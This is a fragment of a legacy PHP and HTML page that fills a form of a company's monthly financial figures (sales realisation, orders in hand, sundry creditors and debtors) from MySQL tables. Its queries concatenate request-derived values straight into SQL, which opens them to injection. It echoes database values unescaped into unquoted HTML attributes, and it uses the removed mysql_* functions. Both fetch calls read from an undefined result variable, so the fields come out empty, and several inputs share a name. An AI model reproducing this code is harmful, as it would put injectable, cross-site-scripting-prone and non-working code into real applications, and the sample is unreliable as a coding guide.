            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">Amount in Rs.<br>
            Lakhs</td>
          </tr>
          <?php
		  	$sql="select * from emp_financial_indicators where company_id=".$companyid." and fin_year='".$year."'
			  and month='".$month."'";
			$resultInd=mysql_query($sql);
			$rowInd=mysql_fetch_assoc($resultPro);  
			
			$sql="select * from emp_statutory_dues where company_id=".$companyid." and fin_year='".$year."'
			  and month='".$month."'";
			$resultSt=mysql_query($sql);
			$rowSt=mysql_fetch_assoc($resultPro);
          ?>
          <tr>
            <td width="44%" class="txtleft">a. Sales realisation during the 
            month</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtSalesRealisation id=txtSalesRealisation
			 class=txtboxwhite size=25 
			value=".$rowInd['sales_realisation'].">";
			?>
			</td>
            <td width="19%" class="txtcenter1">
            <input type=text name=txtActual class=txtboxwhite size="25"></td>
            <td width="20%" class="txtcenter1">
            <input type=text name=txtActual class=txtboxwhite size="25"></td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">b. Value of orders in hand</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtValueOfOrders id=txtValueOfOrders
			 class=txtboxwhite size=25 
			value=".$rowInd['value_of_orders'].">";
			?>
			</td>
            <td width="19%" class="txtcenter1">
            <input type=text name=txtActual class=txtboxwhite size="25"></td>
            <td width="20%" class="txtcenter1">
            <input type=text name=txtActual class=txtboxwhite size="25"></td>
          </tr>
        </table>
        </td>
      </tr>
      <tr>
        <td width="1000" height="31" class="txtleft" colspan="2" valign="top">
        <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="423">
          <tr>
            <td width="266" class="txtleft">c. Sundry Creditors</td>
            <td width="154">
            <?php echo"
            <input type=text name=txtSundryCreditors id=txtSundryCreditors
			 class=txtboxwhite size=25 
			value=".$rowInd['sundry_creditors'].">";
			?>
			</td>
          </tr>
          <tr>
            <td width="266" class="txtleft">d. Sundry Debtors</td>
            <td width="154">
            <?php echo"
            <input type=text name=txtSundryDebtors id=txtSundryDebtors
			 class=txtboxwhite size=25 
			value=".$rowInd['sundry_debtors'].">";
			?>
			</td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
</table>

</body>

</html>